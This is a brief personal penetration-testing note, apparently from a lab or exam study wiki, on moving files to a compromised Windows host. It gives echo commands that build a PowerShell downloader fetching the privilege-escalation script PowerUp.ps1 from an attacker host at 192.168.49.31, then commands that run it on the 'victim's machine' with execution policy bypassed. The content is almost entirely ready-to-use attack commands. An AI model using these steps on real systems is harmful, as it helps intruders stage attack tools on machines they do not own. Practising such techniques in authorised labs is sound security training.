====== File Transfer - PowerShell ======
Created Saturday 06 October 2018

Run the following in attacker's machine
echo $storageDir = $pwd >wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://192.168.49.31:6767/" >> wget.ps1
echo $file = "PowerUp.ps1" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

Run the following in victim's machine(Windows)
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
powershell.exe -ExecutionPolicy Bypass -File wget.ps1
powershell.exe -exec bypass
